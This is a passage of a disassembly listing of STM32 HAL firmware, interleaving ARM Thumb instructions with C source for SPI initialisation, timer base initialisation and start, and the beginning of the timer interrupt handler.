 8004b52:	691a      	ldr	r2, [r3, #16]
 8004b54:	687b      	ldr	r3, [r7, #4]
 8004b56:	699b      	ldr	r3, [r3, #24]
 8004b58:	4903      	ldr	r1, [pc, #12]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b5a:	4313      	orrs	r3, r2
 8004b5c:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004b5e:	7bfb      	ldrb	r3, [r7, #15]
}
 8004b60:	4618      	mov	r0, r3
 8004b62:	3710      	adds	r7, #16
 8004b64:	46bd      	mov	sp, r7
 8004b66:	bd80      	pop	{r7, pc}
 8004b68:	40021000 	.word	0x40021000

08004b6c <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004b6c:	b580      	push	{r7, lr}
 8004b6e:	b084      	sub	sp, #16
 8004b70:	af00      	add	r7, sp, #0
 8004b72:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004b74:	687b      	ldr	r3, [r7, #4]
 8004b76:	2b00      	cmp	r3, #0
 8004b78:	d101      	bne.n	8004b7e <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004b7a:	2301      	movs	r3, #1
 8004b7c:	e095      	b.n	8004caa <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004b7e:	687b      	ldr	r3, [r7, #4]
 8004b80:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b82:	2b00      	cmp	r3, #0
 8004b84:	d108      	bne.n	8004b98 <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004b86:	687b      	ldr	r3, [r7, #4]
 8004b88:	685b      	ldr	r3, [r3, #4]
 8004b8a:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b8e:	d009      	beq.n	8004ba4 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b90:	687b      	ldr	r3, [r7, #4]
 8004b92:	2200      	movs	r2, #0
 8004b94:	61da      	str	r2, [r3, #28]
 8004b96:	e005      	b.n	8004ba4 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b98:	687b      	ldr	r3, [r7, #4]
 8004b9a:	2200      	movs	r2, #0
 8004b9c:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004b9e:	687b      	ldr	r3, [r7, #4]
 8004ba0:	2200      	movs	r2, #0
 8004ba2:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004ba4:	687b      	ldr	r3, [r7, #4]
 8004ba6:	2200      	movs	r2, #0
 8004ba8:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004baa:	687b      	ldr	r3, [r7, #4]
 8004bac:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004bb0:	b2db      	uxtb	r3, r3
 8004bb2:	2b00      	cmp	r3, #0
 8004bb4:	d106      	bne.n	8004bc4 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004bb6:	687b      	ldr	r3, [r7, #4]
 8004bb8:	2200      	movs	r2, #0
 8004bba:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004bbe:	6878      	ldr	r0, [r7, #4]
 8004bc0:	f7fc f8cc 	bl	8000d5c <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004bc4:	687b      	ldr	r3, [r7, #4]
 8004bc6:	2202      	movs	r2, #2
 8004bc8:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004bcc:	687b      	ldr	r3, [r7, #4]
 8004bce:	681b      	ldr	r3, [r3, #0]
 8004bd0:	681a      	ldr	r2, [r3, #0]
 8004bd2:	687b      	ldr	r3, [r7, #4]
 8004bd4:	681b      	ldr	r3, [r3, #0]
 8004bd6:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004bda:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004bdc:	687b      	ldr	r3, [r7, #4]
 8004bde:	68db      	ldr	r3, [r3, #12]
 8004be0:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004be4:	d902      	bls.n	8004bec <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004be6:	2300      	movs	r3, #0
 8004be8:	60fb      	str	r3, [r7, #12]
 8004bea:	e002      	b.n	8004bf2 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004bec:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004bf0:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004bf2:	687b      	ldr	r3, [r7, #4]
 8004bf4:	68db      	ldr	r3, [r3, #12]
 8004bf6:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004bfa:	d007      	beq.n	8004c0c <HAL_SPI_Init+0xa0>
 8004bfc:	687b      	ldr	r3, [r7, #4]
 8004bfe:	68db      	ldr	r3, [r3, #12]
 8004c00:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004c04:	d002      	beq.n	8004c0c <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004c06:	687b      	ldr	r3, [r7, #4]
 8004c08:	2200      	movs	r2, #0
 8004c0a:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004c0c:	687b      	ldr	r3, [r7, #4]
 8004c0e:	685b      	ldr	r3, [r3, #4]
 8004c10:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004c14:	687b      	ldr	r3, [r7, #4]
 8004c16:	689b      	ldr	r3, [r3, #8]
 8004c18:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004c1c:	431a      	orrs	r2, r3
 8004c1e:	687b      	ldr	r3, [r7, #4]
 8004c20:	691b      	ldr	r3, [r3, #16]
 8004c22:	f003 0302 	and.w	r3, r3, #2
 8004c26:	431a      	orrs	r2, r3
 8004c28:	687b      	ldr	r3, [r7, #4]
 8004c2a:	695b      	ldr	r3, [r3, #20]
 8004c2c:	f003 0301 	and.w	r3, r3, #1
 8004c30:	431a      	orrs	r2, r3
 8004c32:	687b      	ldr	r3, [r7, #4]
 8004c34:	699b      	ldr	r3, [r3, #24]
 8004c36:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004c3a:	431a      	orrs	r2, r3
 8004c3c:	687b      	ldr	r3, [r7, #4]
 8004c3e:	69db      	ldr	r3, [r3, #28]
 8004c40:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004c44:	431a      	orrs	r2, r3
 8004c46:	687b      	ldr	r3, [r7, #4]
 8004c48:	6a1b      	ldr	r3, [r3, #32]
 8004c4a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004c4e:	ea42 0103 	orr.w	r1, r2, r3
 8004c52:	687b      	ldr	r3, [r7, #4]
 8004c54:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004c56:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004c5a:	687b      	ldr	r3, [r7, #4]
 8004c5c:	681b      	ldr	r3, [r3, #0]
 8004c5e:	430a      	orrs	r2, r1
 8004c60:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004c62:	687b      	ldr	r3, [r7, #4]
 8004c64:	699b      	ldr	r3, [r3, #24]
 8004c66:	0c1b      	lsrs	r3, r3, #16
 8004c68:	f003 0204 	and.w	r2, r3, #4
 8004c6c:	687b      	ldr	r3, [r7, #4]
 8004c6e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004c70:	f003 0310 	and.w	r3, r3, #16
 8004c74:	431a      	orrs	r2, r3
 8004c76:	687b      	ldr	r3, [r7, #4]
 8004c78:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004c7a:	f003 0308 	and.w	r3, r3, #8
 8004c7e:	431a      	orrs	r2, r3
 8004c80:	687b      	ldr	r3, [r7, #4]
 8004c82:	68db      	ldr	r3, [r3, #12]
 8004c84:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c88:	ea42 0103 	orr.w	r1, r2, r3
 8004c8c:	68fb      	ldr	r3, [r7, #12]
 8004c8e:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c92:	687b      	ldr	r3, [r7, #4]
 8004c94:	681b      	ldr	r3, [r3, #0]
 8004c96:	430a      	orrs	r2, r1
 8004c98:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c9a:	687b      	ldr	r3, [r7, #4]
 8004c9c:	2200      	movs	r2, #0
 8004c9e:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004ca0:	687b      	ldr	r3, [r7, #4]
 8004ca2:	2201      	movs	r2, #1
 8004ca4:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004ca8:	2300      	movs	r3, #0
}
 8004caa:	4618      	mov	r0, r3
 8004cac:	3710      	adds	r7, #16
 8004cae:	46bd      	mov	sp, r7
 8004cb0:	bd80      	pop	{r7, pc}

08004cb2 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004cb2:	b580      	push	{r7, lr}
 8004cb4:	b082      	sub	sp, #8
 8004cb6:	af00      	add	r7, sp, #0
 8004cb8:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004cba:	687b      	ldr	r3, [r7, #4]
 8004cbc:	2b00      	cmp	r3, #0
 8004cbe:	d101      	bne.n	8004cc4 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004cc0:	2301      	movs	r3, #1
 8004cc2:	e049      	b.n	8004d58 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004cc4:	687b      	ldr	r3, [r7, #4]
 8004cc6:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004cca:	b2db      	uxtb	r3, r3
 8004ccc:	2b00      	cmp	r3, #0
 8004cce:	d106      	bne.n	8004cde <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004cd0:	687b      	ldr	r3, [r7, #4]
 8004cd2:	2200      	movs	r2, #0
 8004cd4:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004cd8:	6878      	ldr	r0, [r7, #4]
 8004cda:	f7fc f943 	bl	8000f64 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004cde:	687b      	ldr	r3, [r7, #4]
 8004ce0:	2202      	movs	r2, #2
 8004ce2:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004ce6:	687b      	ldr	r3, [r7, #4]
 8004ce8:	681a      	ldr	r2, [r3, #0]
 8004cea:	687b      	ldr	r3, [r7, #4]
 8004cec:	3304      	adds	r3, #4
 8004cee:	4619      	mov	r1, r3
 8004cf0:	4610      	mov	r0, r2
 8004cf2:	f000 fa7d 	bl	80051f0 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004cf6:	687b      	ldr	r3, [r7, #4]
 8004cf8:	2201      	movs	r2, #1
 8004cfa:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004cfe:	687b      	ldr	r3, [r7, #4]
 8004d00:	2201      	movs	r2, #1
 8004d02:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004d06:	687b      	ldr	r3, [r7, #4]
 8004d08:	2201      	movs	r2, #1
 8004d0a:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004d0e:	687b      	ldr	r3, [r7, #4]
 8004d10:	2201      	movs	r2, #1
 8004d12:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004d16:	687b      	ldr	r3, [r7, #4]
 8004d18:	2201      	movs	r2, #1
 8004d1a:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004d1e:	687b      	ldr	r3, [r7, #4]
 8004d20:	2201      	movs	r2, #1
 8004d22:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004d26:	687b      	ldr	r3, [r7, #4]
 8004d28:	2201      	movs	r2, #1
 8004d2a:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004d2e:	687b      	ldr	r3, [r7, #4]
 8004d30:	2201      	movs	r2, #1
 8004d32:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004d36:	687b      	ldr	r3, [r7, #4]
 8004d38:	2201      	movs	r2, #1
 8004d3a:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004d3e:	687b      	ldr	r3, [r7, #4]
 8004d40:	2201      	movs	r2, #1
 8004d42:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004d46:	687b      	ldr	r3, [r7, #4]
 8004d48:	2201      	movs	r2, #1
 8004d4a:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004d4e:	687b      	ldr	r3, [r7, #4]
 8004d50:	2201      	movs	r2, #1
 8004d52:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004d56:	2300      	movs	r3, #0
}
 8004d58:	4618      	mov	r0, r3
 8004d5a:	3708      	adds	r7, #8
 8004d5c:	46bd      	mov	sp, r7
 8004d5e:	bd80      	pop	{r7, pc}

08004d60 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004d60:	b480      	push	{r7}
 8004d62:	b085      	sub	sp, #20
 8004d64:	af00      	add	r7, sp, #0
 8004d66:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004d68:	687b      	ldr	r3, [r7, #4]
 8004d6a:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004d6e:	b2db      	uxtb	r3, r3
 8004d70:	2b01      	cmp	r3, #1
 8004d72:	d001      	beq.n	8004d78 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004d74:	2301      	movs	r3, #1
 8004d76:	e03b      	b.n	8004df0 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004d78:	687b      	ldr	r3, [r7, #4]
 8004d7a:	2202      	movs	r2, #2
 8004d7c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004d80:	687b      	ldr	r3, [r7, #4]
 8004d82:	681b      	ldr	r3, [r3, #0]
 8004d84:	68da      	ldr	r2, [r3, #12]
 8004d86:	687b      	ldr	r3, [r7, #4]
 8004d88:	681b      	ldr	r3, [r3, #0]
 8004d8a:	f042 0201 	orr.w	r2, r2, #1
 8004d8e:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d90:	687b      	ldr	r3, [r7, #4]
 8004d92:	681b      	ldr	r3, [r3, #0]
 8004d94:	4a19      	ldr	r2, [pc, #100]	; (8004dfc <HAL_TIM_Base_Start_IT+0x9c>)
 8004d96:	4293      	cmp	r3, r2
 8004d98:	d009      	beq.n	8004dae <HAL_TIM_Base_Start_IT+0x4e>
 8004d9a:	687b      	ldr	r3, [r7, #4]
 8004d9c:	681b      	ldr	r3, [r3, #0]
 8004d9e:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004da2:	d004      	beq.n	8004dae <HAL_TIM_Base_Start_IT+0x4e>
 8004da4:	687b      	ldr	r3, [r7, #4]
 8004da6:	681b      	ldr	r3, [r3, #0]
 8004da8:	4a15      	ldr	r2, [pc, #84]	; (8004e00 <HAL_TIM_Base_Start_IT+0xa0>)
 8004daa:	4293      	cmp	r3, r2
 8004dac:	d115      	bne.n	8004dda <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004dae:	687b      	ldr	r3, [r7, #4]
 8004db0:	681b      	ldr	r3, [r3, #0]
 8004db2:	689a      	ldr	r2, [r3, #8]
 8004db4:	4b13      	ldr	r3, [pc, #76]	; (8004e04 <HAL_TIM_Base_Start_IT+0xa4>)
 8004db6:	4013      	ands	r3, r2
 8004db8:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004dba:	68fb      	ldr	r3, [r7, #12]
 8004dbc:	2b06      	cmp	r3, #6
 8004dbe:	d015      	beq.n	8004dec <HAL_TIM_Base_Start_IT+0x8c>
 8004dc0:	68fb      	ldr	r3, [r7, #12]
 8004dc2:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004dc6:	d011      	beq.n	8004dec <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004dc8:	687b      	ldr	r3, [r7, #4]
 8004dca:	681b      	ldr	r3, [r3, #0]
 8004dcc:	681a      	ldr	r2, [r3, #0]
 8004dce:	687b      	ldr	r3, [r7, #4]
 8004dd0:	681b      	ldr	r3, [r3, #0]
 8004dd2:	f042 0201 	orr.w	r2, r2, #1
 8004dd6:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004dd8:	e008      	b.n	8004dec <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004dda:	687b      	ldr	r3, [r7, #4]
 8004ddc:	681b      	ldr	r3, [r3, #0]
 8004dde:	681a      	ldr	r2, [r3, #0]
 8004de0:	687b      	ldr	r3, [r7, #4]
 8004de2:	681b      	ldr	r3, [r3, #0]
 8004de4:	f042 0201 	orr.w	r2, r2, #1
 8004de8:	601a      	str	r2, [r3, #0]
 8004dea:	e000      	b.n	8004dee <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004dec:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004dee:	2300      	movs	r3, #0
}
 8004df0:	4618      	mov	r0, r3
 8004df2:	3714      	adds	r7, #20
 8004df4:	46bd      	mov	sp, r7
 8004df6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004dfa:	4770      	bx	lr
 8004dfc:	40012c00 	.word	0x40012c00
 8004e00:	40014000 	.word	0x40014000
 8004e04:	00010007 	.word	0x00010007

08004e08 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004e08:	b580      	push	{r7, lr}
 8004e0a:	b084      	sub	sp, #16
 8004e0c:	af00      	add	r7, sp, #0
 8004e0e:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004e10:	687b      	ldr	r3, [r7, #4]
 8004e12:	681b      	ldr	r3, [r3, #0]
 8004e14:	68db      	ldr	r3, [r3, #12]
 8004e16:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004e18:	687b      	ldr	r3, [r7, #4]
 8004e1a:	681b      	ldr	r3, [r3, #0]
 8004e1c:	691b      	ldr	r3, [r3, #16]
 8004e1e:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004e20:	68bb      	ldr	r3, [r7, #8]
 8004e22:	f003 0302 	and.w	r3, r3, #2
 8004e26:	2b00      	cmp	r3, #0
 8004e28:	d020      	beq.n	8004e6c <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004e2a:	68fb      	ldr	r3, [r7, #12]
 8004e2c:	f003 0302 	and.w	r3, r3, #2
 8004e30:	2b00      	cmp	r3, #0
 8004e32:	d01b      	beq.n	8004e6c <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004e34:	687b      	ldr	r3, [r7, #4]
 8004e36:	681b      	ldr	r3, [r3, #0]
 8004e38:	f06f 0202 	mvn.w	r2, #2
 8004e3c:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004e3e:	687b      	ldr	r3, [r7, #4]
 8004e40:	2201      	movs	r2, #1
 8004e42:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004e44:	687b      	ldr	r3, [r7, #4]
 8004e46:	681b      	ldr	r3, [r3, #0]
 8004e48:	699b      	ldr	r3, [r3, #24]
 8004e4a:	f003 0303 	and.w	r3, r3, #3
 8004e4e:	2b00      	cmp	r3, #0
 8004e50:	d003      	beq.n	8004e5a <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004e52:	6878      	ldr	r0, [r7, #4]
 8004e54:	f000 f9ad 	bl	80051b2 <HAL_TIM_IC_CaptureCallback>
 8004e58:	e005      	b.n	8004e66 <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e5a:	6878      	ldr	r0, [r7, #4]
 8004e5c:	f000 f99f 	bl	800519e <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e60:	6878      	ldr	r0, [r7, #4]
 8004e62:	f000 f9b0 	bl	80051c6 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e66:	687b      	ldr	r3, [r7, #4]
 8004e68:	2200      	movs	r2, #0
 8004e6a:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004e6c:	68bb      	ldr	r3, [r7, #8]
 8004e6e:	f003 0304 	and.w	r3, r3, #4
 8004e72:	2b00      	cmp	r3, #0
 8004e74:	d020      	beq.n	8004eb8 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004e76:	68fb      	ldr	r3, [r7, #12]
 8004e78:	f003 0304 	and.w	r3, r3, #4
 8004e7c:	2b00      	cmp	r3, #0
 8004e7e:	d01b      	beq.n	8004eb8 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004e80:	687b      	ldr	r3, [r7, #4]
 8004e82:	681b      	ldr	r3, [r3, #0]
 8004e84:	f06f 0204 	mvn.w	r2, #4
 8004e88:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e8a:	687b      	ldr	r3, [r7, #4]
 8004e8c:	2202      	movs	r2, #2
 8004e8e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e90:	687b      	ldr	r3, [r7, #4]
 8004e92:	681b      	ldr	r3, [r3, #0]
 8004e94:	699b      	ldr	r3, [r3, #24]
 8004e96:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e9a:	2b00      	cmp	r3, #0
 8004e9c:	d003      	beq.n	8004ea6 <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e9e:	6878      	ldr	r0, [r7, #4]
 8004ea0:	f000 f987 	bl	80051b2 <HAL_TIM_IC_CaptureCallback>
 8004ea4:	e005      	b.n	8004eb2 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ea6:	6878      	ldr	r0, [r7, #4]
 8004ea8:	f000 f979 	bl	800519e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004eac:	6878      	ldr	r0, [r7, #4]
 8004eae:	f000 f98a 	bl	80051c6 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004eb2:	687b      	ldr	r3, [r7, #4]
 8004eb4:	2200      	movs	r2, #0
 8004eb6:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004eb8:	68bb      	ldr	r3, [r7, #8]
 8004eba:	f003 0308 	and.w	r3, r3, #8
